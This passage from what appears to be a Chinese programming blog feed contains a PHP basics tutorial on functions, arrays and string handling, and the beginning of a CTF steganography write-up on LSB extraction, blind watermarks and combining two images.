id="4、特殊的流程控制语句"><a href="#4、特殊的流程控制语句" class="headerlink" title="4、特殊的流程控制语句"></a>4、特殊的流程控制语句</h4><p><strong>1.break语句</strong><br>作用：用于switch语句，for，while，do…while，foreach，用于中断这些语句！ 后面可以接上一个数字来表示跳出几层循环！默认不加就是跳出当前循环语句！<br><strong>2.continue语句</strong><br>作用：只能用在循环语句，跳出本次循环，并不是结束整个循环语句！<br><strong>3.exit()语句</strong><br>作用：结束当前整个程序的执行！<br><code>和die()作用一样</code></p><h3 id="三、函数"><a href="#三、函数" class="headerlink" title="三、函数"></a>三、函数</h3><h4 id="1、自定义函数"><a href="#1、自定义函数" class="headerlink" title="1、自定义函数"></a>1、自定义函数</h4><pre><code class="php">function 函数名([形式参数1,形式参数2,....形式参数n]){        //各种PHP代码....        //......        return 表达式;//也可以不返回，如果不写那么默认返回null}</code></pre><p><em>函数的调用</em>: 函数的调用需要遵循定义函数的时候写的规则，一一对应，将具体实参传给定义函数时候写的形参<br>调用函数之后执行的过程是相对独立的，互补干扰，默认没有联系<br>执行完毕返回调用的位置继续向下执行<br><code>return 函数的返回值</code>：返回给调用者,默认返回null</p><p><strong>如：</strong></p><pre><code class="php">&lt;?php function test($a,$b){//形参    echo $a+$b;}test(2,4);?&gt;</code></pre><h4 id="2、PHP变量的范围"><a href="#2、PHP变量的范围" class="headerlink" title="2、PHP变量的范围"></a>2、PHP变量的范围</h4><p><strong>1.局部变量</strong></p><pre><code class="php">function test(){    $a=1;//局部变量$a，仅在函数内部有效}echo $a;//输出$a不存在</code></pre><p><strong>2.全局变量</strong></p><pre><code class="php">$i=10;//全局变量（外部变量）define(&#39;MY_NAME&#39;,&#39;xiaoming&#39;);function test(){    echo MY_NAME;    global $i;//声明$i全局变量,函数内部才可以使用$i    echo $i;    $a=1;}//include &#39;&#39;引入test();</code></pre><p><strong>3.静态变量</strong></p><p><img src="http://img-blog.csdnimg.cn/20190716155417857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="php">function test(){            static $a=10;//静态变量$a,初始化静态变量,仅在第一次调用的时候执行            echo ++$a;//当第二次执行这个函数的时候$a这个变量依然存在并且里面的值也依然存在}        test();        echo &#39;&lt;br /&gt;&#39;;        test();        echo &#39;&lt;br /&gt;&#39;;        test();        echo &#39;&lt;br /&gt;&#39;;</code></pre><h4 id="3、参数的传递"><a href="#3、参数的传递" class="headerlink" title="3、参数的传递"></a>3、参数的传递</h4><p><strong>1.按值传递参数</strong><br>传递参数的时候默认使用<br>对形参的操作，根本不是影响到实参(变量)的值，两者相当于没有联系!<br><strong>2.按引用传递参数</strong><br>    按引用传递参数，相当于形参和实参指的是同一个人，只是名字不一样，对于形参的操作会直接影响到实参（变量）;<br><strong>3.函数的默认参数</strong><br>可以给形参设置默认值，设置方法:直接赋值<br>给形参加默认值的时候是重右往左加的，右边的必须有，才能够给左边的加</p><p>例:</p><pre><code class="php">&lt;?phpfunction test($a,$b=100){    echo $a+$b;}test(200);?&gt;</code></pre><p><strong>4.可变长度参数列表</strong><br>PHP提供给我们的，可以直接使用</p><pre><code class="php">func_get_args();//返回全部参数func_get_arg();//返回第()参数,从0开始计数func_num_args();//返回所在自定义函数的个数</code></pre><p>​    这三个函数可以使用在我们的自定义函数内部，能够返回给我们一些关于参数的信息!</p><h4 id="4、可变函数（变量函数）"><a href="#4、可变函数（变量函数）" class="headerlink" title="4、可变函数（变量函数）"></a>4、可变函数（变量函数）</h4><p>直接把函数赋值给变量</p><p>例：</p><pre><code class="php">function test(){    echo &quot;asdff&quot;;}$a=&#39;test&#39;;$a();echo $a;</code></pre><p>​    可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数 </p><h4 id="5、递归函数"><a href="#5、递归函数" class="headerlink" title="5、递归函数"></a>5、递归函数</h4><p>递归函数即在函数内部自己调用自己的函数。<br>递归函数：<br>(1)函数在被调用的执行过程中会在内存里面分配空间用于存储临时数据，那么函数在执行过程中默认之间时没有联系的（除了静态变量，按引用传，全局变量）。里面的变量默认都是局部变量，相互之间没有影响！<br>(2)递归函数，在函数的内部需要有适时结束函数运行的条件！</p><p>例：</p><pre><code class="php">function test($a){        echo $a.&#39;&amp;nbsp;&#39;;        if($a&gt;0){            test($a-1);        }        else{            echo &#39;-------&#39;;        }        echo $a.&#39;&amp;nbsp;&#39;;    }test(5);</code></pre><p>执行结果：<br><img src="http://img-blog.csdnimg.cn/20190716155443875.png" alt="在这里插入图片描述"></p><p>查看网页源代码：</p><p><img src="http://img-blog.csdnimg.cn/20190716155507245.png" alt="在这里插入图片描述"></p><h4 id="6、内部（内置）函数"><a href="#6、内部（内置）函数" class="headerlink" title="6、内部（内置）函数"></a>6、内部（内置）函数</h4><p>PHP提供许多现成的函数或者结构，可以在实际开发中直接使用。<br>还有一些函数需要开启特定地 PHP 扩展模块，否则在使用它们的时候就会得到一个致命的“未定义函数”错误。<br>常用的内置函数或扩展的函数，有这样的需求，才会去找对应的函数。</p><h3 id="四、数组"><a href="#四、数组" class="headerlink" title="四、数组"></a>四、数组</h3><p><strong>数组：</strong><br><img src="http://img-blog.csdnimg.cn/20190716155522241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="1、数组类型"><a href="#1、数组类型" class="headerlink" title="1、数组类型"></a>1、数组类型</h4><p>复合数据类型</p><h4 id="2、数组创建"><a href="#2、数组创建" class="headerlink" title="2、数组创建"></a>2、数组创建</h4><p><strong>方法一：</strong><br>变量名称[索引值]=数据;<br>变量名称[]=数据;//不写索引值默认是 索引数组，从0开始</p><p><strong>例：</strong></p><pre><code class="php">//$student[索引值]=具体的值//索引数组$student[0]=12;$student[1]=&#39;小明&#39;;$student[2]=true;$student[3]=32.8;//需要使用print_r()函数来输出数组的具体内容print_r($student);//var_dump($student);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716155602759.png" alt="在这里插入图片描述"></p><pre><code class="php">//$student[索引值]=具体的值//关联数组$student[&#39;age&#39;]=12;$student[&#39;name&#39;]=&#39;小明&#39;;$student[&#39;sex&#39;]=true;$student[&#39;grade&#39;]=32.8;//需要使用print_r()函数来输出数组的具体内容print_r($student);//var_dump($student);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801132120855.png" alt="在这里插入图片描述"></p><p><strong>方法二：</strong><br>变量名称=array(<br>    索引值=&gt;数据,<br>    ……….<br>);</p><p><strong>例：</strong></p><pre><code class="php">$student=array(12,&#39;小明&#39;,true,32.8);print_r($student);//var_dump($student);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716155623688.png" alt="在这里插入图片描述"></p><pre><code class="php">//还可以写成$student=array(    0=&gt;12,    1=&gt;&#39;小明&#39;,    2=&gt; true,    3=&gt;32.8);print_r($student);//var_dump($student);</code></pre><p><strong>关联数组同上</strong></p><p>数据里面还可放数组类型的数据，同一个数组中存储任何类型的数据<br><strong>多维数组：</strong><br>访问数值的方法<br>变量名称[索引值][索引值]….</p><p><strong>例：</strong></p><pre><code class="php">//二维数组$student=array(    0=&gt;array(15,&#39;小红&#39;,true,63.2),    1=&gt;array(16,&#39;小明&#39;,true,70.3),    2=&gt;array(17,&#39;小张&#39;,true,65.4));print_r($student);//var_dump($student);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716155710422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="3、数组的遍历"><a href="#3、数组的遍历" class="headerlink" title="3、数组的遍历"></a>3、数组的遍历</h4><p>遍历数组：每个都经历一遍<br>(1）for循环<br>    用的比较少，因为有缺陷</p><p><u>count(数组)返回数组里面数据的个数，还可以获取多维数组的个数</u></p><p>例：</p><pre><code class="php">$student=array(12,&#39;小明&#39;,true,32.8);echo count($student);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716155749604.png" alt="在这里插入图片描述"></p><p><strong>(2）foreach语句来实现遍历数组的目的</strong></p><pre><code class="php">foreach(数组变量 as 变量1){    //每次循环执行的语句    变量1代表当前正在经历（访问）的数据}</code></pre><p><strong>例：</strong></p><pre><code class="php">$student=array(12,&#39;小明&#39;,true,32.8);foreach($student as $value){    echo $value.&#39;&lt;br /&gt;&#39;;}</code></pre><p><img src="http://img-blog.csdnimg.cn/2019071615580854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="php">foreach(数组变量 as 变量1=&gt;变量2){    //每次循环执行的语句    变量1代表当前正在经历（访问）的数据的索引值    变量1代表当前正在经历（访问）的数据}</code></pre><p><strong>例：</strong></p><pre><code class="php">$student=array(12,&#39;小明&#39;,true,32.8);foreach($student as $key=&gt;$value){    echo $key.&#39;-&#39;.$value.&#39;&lt;br /&gt;&#39;;}</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716155829457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>规则多维数组的遍历：</p><pre><code class="php">$arr=array(    0=&gt;array(15,&#39;小红&#39;,true,63.2),    1=&gt;array(16,&#39;小明&#39;,true,70.3),    2=&gt;array(17,&#39;小张&#39;,true,65.4));foreach($arr as $brr){    foreach($brr as $val){        echo $val.&#39;&lt;br /&gt;&#39;;    }}</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716155845608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><em>不规则多维数组的遍历，可以用递归思想解决</em></p><h4 id="4、预定义超全局数组变量"><a href="#4、预定义超全局数组变量" class="headerlink" title="4、预定义超全局数组变量"></a>4、预定义超全局数组变量</h4><p>已经定义过（存在）的变量(存放的数据的类型是数组)<br>超全局：超级全局变量，作用域（有效区域）</p><p>传递数据（提交数据）给服务器端主要两种方式</p><h5 id="1-get方式"><a href="#1-get方式" class="headerlink" title="1.get方式"></a>1.get方式</h5><p>比如：</p><pre><code class="php">?参数名=参数值&amp;参数名=参数值......</code></pre><p><a href="http://localhost/php/index.php?参数名=参数值" target="_blank" rel="noopener">http://localhost/php/index.php?参数名=参数值</a><br>在服务器端（请求的php文件这边）可以通过<code>$_GET</code>来获取到<br><code>$_GET</code>索引值为参数名，索引值对应的数据就是参数值</p><pre><code class="php">&lt;?phpvar_dump($_GET);?&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716155906168.png" alt="在这里插入图片描述"></p><p><strong>缺点：不太安全</strong></p><p><img src="http://img-blog.csdnimg.cn/20190716155923777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190716155938196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="2-post方式"><a href="#2-post方式" class="headerlink" title="2.post方式"></a>2.post方式</h5><p>比如表单 post发送过来的！<br>可以通过<code>$_POST</code>来获取到!</p><p><img src="http://img-blog.csdnimg.cn/20190716155958657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190716160009797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="5、处理数组的相关函数"><a href="#5、处理数组的相关函数" class="headerlink" title="5、处理数组的相关函数"></a>5、处理数组的相关函数</h4><p><strong>(1)array_count_values统计数组中所有值出现的次数</strong></p><pre><code class="php">$array = array(1, &quot;hello&quot;, 1, &quot;world&quot;, &quot;hello&quot;);print_r(array_count_values($array));//函数返回数组类型的数据//print_r($array);//原来的数组不会受到任何影响</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716160028333.png" alt="在这里插入图片描述"></p><p><strong>(2)array_key_exists检查给定的键名或索引是否存在于数组中</strong></p><pre><code class="php">$search_array = array(&#39;first&#39; =&gt; 1, &#39;second&#39; =&gt; 4);var_dump(array_key_exists(&#39;second&#39;,$search_array));</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716160044384.png" alt="在这里插入图片描述"></p><p><strong>(3)array_search在数组中搜索给定的值，如果成功则返回相应的键名</strong></p><pre><code class="php">$array = array(0 =&gt; &#39;blue&#39;, 1 =&gt; &#39;red&#39;, 2 =&gt; &#39;green&#39;, 3 =&gt; &#39;red&#39;,4=&gt;15);var_dump(array_search(&#39;15&#39;, $array,true));</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716160057334.png" alt="在这里插入图片描述"></p><p><strong>(4)count计算数组中的单元数目或对象中的属性个数</strong></p><pre><code class="php">$array = array(0 =&gt; &#39;blue&#39;, 1 =&gt; &#39;red&#39;, 2 =&gt; &#39;green&#39;, 3 =&gt; &#39;red&#39;,4=&gt;15);var_dump(count($array));</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716160115691.png" alt="在这里插入图片描述"></p><p><strong>(5)in_array检查数组中是否存在某个值</strong></p><pre><code class="php">$os = array(&quot;Mac&quot;, &quot;NT&quot;, &quot;Irix&quot;, &quot;Linux&quot;);var_dump(in_array(&#39;Mac&#39;, $os));</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716160128234.png" alt="在这里插入图片描述"></p><p><strong>(6)list把数组中的值赋给一些变量</strong></p><pre><code class="php">$arr=array(60,80,100);list($sunshengli,$xiaohong,$xiaoming)=array(60,80,100);echo $sunshengli;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716160143843.png" alt="在这里插入图片描述"></p><p><strong>(7)asort对数组进行排序并保持索引关系</strong></p><pre><code class="php">$students=array(    &#39;xiaoming&#39;=&gt;60,    &#39;lilei&#39;=&gt;80,    &#39;lihua&#39;=&gt;100,    &#39;zhangsan&#39;=&gt;90);asort($students);print_r($students);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716160156109.png" alt="在这里插入图片描述"></p><p>直接对数组里面的数据进行排序，第二个参数<br><u>SORT_REGULAR - 正常比较单元（不改变类型）</u><br><u>SORT_NUMERIC - 单元被作为数字来比较</u><br><u>SORT_STRING - 单元被作为字符串来比较</u><br><u>SORT_LOCALE_STRING - 根据当前的区域（locale）设置来把单元当作字符串比较。</u><br><strong>(8)array_filter用回调函数过滤数组中的单元</strong></p><pre><code class="php">function odd($var){    return($var % 2 == 1);}function even($var){    return($var % 2 == 0);}$array1 = array(&quot;a&quot;=&gt;1, &quot;b&quot;=&gt;2, &quot;c&quot;=&gt;3, &quot;d&quot;=&gt;4, &quot;e&quot;=&gt;5);$array2 = array(6, 7, 8, 9, 10, 11, 12);echo &quot;Odd :\n&quot;;print_r(array_filter($array1, &quot;odd&quot;));echo &quot;Even:\n&quot;;print_r(array_filter($array2, &quot;even&quot;));</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716160210671.png" alt="在这里插入图片描述"></p><p>​    <strong><a href="http://www.php.net/manual/zh/ref.array.php" target="_blank" rel="noopener">所有数组函数</a></strong></p><h3 id="五、字符串处理"><a href="#五、字符串处理" class="headerlink" title="五、字符串处理"></a>五、字符串处理</h3><h4 id="1、去除空格或其他字符函数"><a href="#1、去除空格或其他字符函数" class="headerlink" title="1、去除空格或其他字符函数"></a>1、去除空格或其他字符函数</h4><p><strong>trim</strong></p><pre><code class="php">$str=&#39;    abc   &#39;;var_dump($str);var_dump(trim($str));//去除左右两边空白$str=&#39;abcabcdefac&#39;;var_dump($str);var_dump(trim($str,&#39;bac&#39;));//如果要去除多个字符可以连着写//trim去除两边//ltrim去除左边//rtrim去除右边</code></pre><h4 id="2、大小写转换函数"><a href="#2、大小写转换函数" class="headerlink" title="2、大小写转换函数"></a>2、大小写转换函数</h4><pre><code class="php">$str=&#39;test&#39;;var_dump($str);$str1=strtoupper($str);var_dump($str);</code></pre><pre><code class="php">$str=&#39;TeSt&#39;;var_dump($str);var_dump(strtolower($str));var_dump($str);</code></pre><h4 id="3、字符串查找函数"><a href="#3、字符串查找函数" class="headerlink" title="3、字符串查找函数"></a>3、字符串查找函数</h4><p><strong>1.substr_count统计某字符串出现的次数</strong></p><pre><code class="php">$str=&#39;testteste&#39;;var_dump(substr_count($str,&#39;te&#39;));//统计某字符串出现的次数，不会计算重叠字符串,如：abcabcabc -&gt;1</code></pre><pre><code class="php">$str=&#39;testteste&#39;;var_dump(substr_count($str,&#39;te&#39;,1,8));//不能超出字符串,从第二个到第九个查找</code></pre><p><strong>2.strpos查找某字符串首次出现的位置</strong></p><pre><code class="php">$str=&#39;testteste&#39;;var_dump(strpos($str, &#39;t1&#39;));if(strpos($str, &#39;t&#39;)===false){    echo &#39;没找到！&#39;;}else{    echo &#39;找到啦!&#39;;}$str=&#39;testteste&#39;;var_dump(strpos($str, &#39;t&#39;,1));//从第二个开始查找</code></pre><p><strong>3.strstr查找从某字符出现的位置到结尾的字符串</strong></p><pre><code class="php">$str=&#39;testteste&#39;;var_dump($str);var_dump(strstr($str,&#39;s&#39;));var_dump(strstr($str,&#39;s&#39;,true));//查找从某字符出现的位置到开始的字符串</code></pre><h4 id="4、字符串替换函数"><a href="#4、字符串替换函数" class="headerlink" title="4、字符串替换函数"></a>4、字符串替换函数</h4><p><strong>str_replace</strong></p><pre><code class="php">$str=&#39;testestab&#39;;var_dump($str);var_dump(str_replace(&#39;t&#39;,&#39;T&#39;,$str));</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716160241354.png" alt="在这里插入图片描述"></p><pre><code class="php">$str=array(    &#39;abc123abc&#39;,    &#39;123abcabc&#39;,    &#39;abcab123c&#39;);var_dump($str);$str1=str_replace(array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;),array(&#39;一&#39;,&#39;二&#39;,&#39;三&#39;),$str,$count);echo $count;//替换发生的次数var_dump($str1);</code></pre><h4 id="5、与html标签相关的函数"><a href="#5、与html标签相关的函数" class="headerlink" title="5、与html标签相关的函数"></a>5、与html标签相关的函数</h4><p><strong>1.htmlspecialchars把预定义字符转换成html实体</strong></p><pre><code class="php">$str=&lt;&lt;&lt;START&lt;p style=&quot;color:red;font-size:128px;&quot;&gt;我去问让他&lt;/p&gt;&quot;START;echo $str;echo &quot;\n&quot;;echo htmlspecialchars($str);//把预定义字符转换成html实体</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716160257982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2.strip_tags从字符串中去除HTML和PHP标记</strong></p><pre><code class="php">$str=&lt;&lt;&lt;START&lt;p style=&quot;color:red;font-size:128px;&quot;&gt;单位确定为取得完全&lt;/p&gt;&lt;div style=&quot;color:red;&quot;&gt;我的名字&lt;/div&gt;START;//echo $str;//echo &quot;\n&quot;;echo strip_tags($str,&quot;&lt;div&gt;&lt;p&gt;&quot;);</code></pre><h4 id="6、字符串截取函数"><a href="#6、字符串截取函数" class="headerlink" title="6、字符串截取函数"></a>6、字符串截取函数</h4><p><strong>substr</strong></p><pre><code class="php">$str=&#39;qwzftest&#39;;echo substr($str,3,2);//从第四个开始截，截两个//不填2默认截到结尾$str=&#39;test&#39;;echo substr($str,-3,2);//-3是从结尾开始数到倒数第三个</code></pre><h4 id="7、字符串分隔函数"><a href="#7、字符串分隔函数" class="headerlink" title="7、字符串分隔函数"></a>7、字符串分隔函数</h4><p><strong>1.explode</strong></p><pre><code class="php">$str=&#39;test,test1,test2,test3&#39;;var_dump(explode(&#39;,&#39;,$str,2));//默认有几个“，”分隔几段。2表示分隔两段</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716160415328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2.str_split</strong></p><pre><code class="php">$str=&#39;test&#39;;var_dump(str_split($str,3));//默认每段一个字符，3表示每段3个字符</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基本语法 </tag>
            
            <tag> 流程控制 </tag>
            
            <tag> 函数 </tag>
            
            <tag> 数组 </tag>
            
            <tag> 字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MISC-隐写的总结</title>
      <link href="/2019/04/06/MISC-%E9%9A%90%E5%86%99%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2019/04/06/MISC-%E9%9A%90%E5%86%99%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>这周做了几个隐写题，感觉非常有趣。看了许多大佬的博客，最终才完整的做完这些隐写题。为了加深自己的理解，还是有必要总结一下的。毕竟学以致用，学以会用！！</p><p>解隐写题的一般思路:</p><ul><li>首先看看图片是不是<strong>图种</strong></li><li>然后使用binwalker分析图片,如果是有文件合成,分离</li><li>有时信息藏在备注中</li><li>工具stegsolve</li><li>编程分析</li></ul><h3 id="1、LSB隐写"><a href="#1、LSB隐写" class="headerlink" title="1、LSB隐写"></a>1、LSB隐写</h3><h5 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h5><p>LSB(英文 least significant bit)即最低有效位。LSB加密是信息隐藏中最基本的方法。由于人们识别声音或图片的能力有限，因此我们稍微改动信息的某一位是不会影响我们识别声音或图片的。</p><h5 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h5><p>通常来说LSB加密用在无损压缩的数据格式文件中，例如图像中的png格式、bmp格式和音频的wav格式。由于这三种格式未对源数据进行有损压缩，因此可以将信息隐藏起来。</p><p>对于图像文件LSB的特征很明显，通常将信息隐藏在某一个颜色通道中。我们可以查看图片的每个像素点的RGB值，或者使用stegsolve工具进行查看。     <a href="http://aur.archlinux.org/packages/stegsolve/" target="_blank" rel="noopener">stegsolve工具下载</a></p><p>需要下载Java配置Java环境或者只下载Java，用Java打开stegsolve.jar文件</p><p><strong>由于图像是由像素构成的，每个像素有8位(对于BMP图像来说),通常最后一位的变化，通过肉眼是无法察觉的</strong> </p><p><strong>例1：</strong></p><p>下载题目文件并解压后，发现一个名叫taqing.png的图片。因为题目是“LSB”，所以这张图片应该进行了LSB隐写。</p><p>用stegsolve打开taqing.png,并选择Analyse的Data Extract</p><p><img src="http://img-blog.csdnimg.cn/20190716163435249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>把Red、Green、Blue的最低有效位0那一列打对勾（<a href="https://www.cnblogs.com/nul1/p/9594387.html" target="_blank" rel="noopener">原因</a>），并点击Preview，在最上面会发现flag了！！</p><p><img src="http://img-blog.csdnimg.cn/20190716163452542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>flag是flag{have a good time!}</p><p><strong>例2：</strong></p><p>下载题目文件并解压后，发现一个名叫LSBencode.png的图片。因为题目是“LSB2”，所以这张图片也应该进行了LSB隐写。</p><p>用stegsolve打开LSBencode.png,并选择Analyse的Data Extract</p><p><img src="http://img-blog.csdnimg.cn/20190716163512197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>把Red、Green、Blue的最低有效位0那一列打对勾（<a href="http://www.cnblogs.com/nul1/p/9594387.html" target="_blank" rel="noopener">原因</a>），并点击Preview，在最上面会发现flag了！！</p><p><img src="http://img-blog.csdnimg.cn/20190716163523527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="2、盲水印"><a href="#2、盲水印" class="headerlink" title="2、盲水印"></a>2、盲水印</h3><p>由题目可知，此题为<strong>盲水印</strong>，所以使用bwm脚本（python2）另一个脚本decode脚本。</p><p><a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">bwm脚本</a> <a href="https://github.com/linyacool/blind-watermark" target="_blank" rel="noopener">decode脚本</a></p><p>并且这两个不完全一样，用其中一个加上水印，用另一个解不开，所以还是都存起来吧。</p><p>运行脚本发现没有cv2这个模块，使用下面的命令安装cv2<br><code>pip install opencv-python</code></p><p>接下来：</p><p><strong>如果是bwm脚本运行</strong></p><p><code>python bwm.py decode 1.png 2.png flag.png</code></p><p>其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。</p><p><strong>如果是decode脚本运行</strong></p><p><code>python decode.py --original 1.png --image 2.png --result flag.png</code>。</p><p>其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。</p><p><strong>另外推荐一个加盲水印和分离盲水印的神器：</strong><a href="https://www.anxz.com/down/10929.html" target="_blank" rel="noopener">WaterMarkH下载</a></p><p><strong>例：</strong></p><p>下载题目文件并解压后，发现两张图片：text.jpg和text2.jpg。因为题目是“盲水印”，所以这道题应该是找盲水印。</p><p><img src="http://img-blog.csdnimg.cn/20190716163559148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>把文件后缀改成.png格式，结果我试了两个脚本都没有找到盲水印，我以为是因为python版本的问题，然而并不是。。。所以这道题应该是使用WaterMarkH加的盲水印，所以直接使用这个工具就找到了盲水印</p><p><img src="http://img-blog.csdnimg.cn/20190716163612541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="3、双图"><a href="#3、双图" class="headerlink" title="3、双图"></a>3、双图</h3><p><strong>例：</strong></p><p>下载题目文件，解压出来就是双图first.png和second.png，先用stegslove打开first.png保存反色图片为1.bmp</p><p><img src="http://img-blog.csdnimg.cn/20190716163726373.jpg" alt="在这里插入图片描述"></p><p>然后打开保存的反色图片1.bmp，选择stegslove的image combiner结合second.png，保存结合的图片为solved.bmp</p><p><img src="http://img-blog.csdnimg.cn/20190716163853967.jpg" alt="在这里插入图片描述"></p><p>然后打开保存的结合图片solved.bmp，再用stegslove对二维码变化一下，得到三张二维码</p><p><img src="http://img-blog.csdnimg.cn/20190716163936683.png" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190716163953858.png" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190716164004894.png" alt="在这里插入图片描述"></p><p>扫描结果是DES  6XaMMbM7<br>  和一长串字符，很显然是des加密，秘钥是6XaMMbM7，然后对长串字符进行DES解密，即可得到flag！！</p><h3 id="4、画图"><a href="#4、画图" class="headerlink" title="4、画图"></a>4、画图</h3><p><strong>例：</strong></p><p><img src="http://img-blog.csdnimg.cn/20190716164022443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>根据题目可知，此题是画图<br><img src="http://img-blog.csdnimg.cn/20190716164036505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>用winhex打开发现图片后面有很多的数据</p><p><img 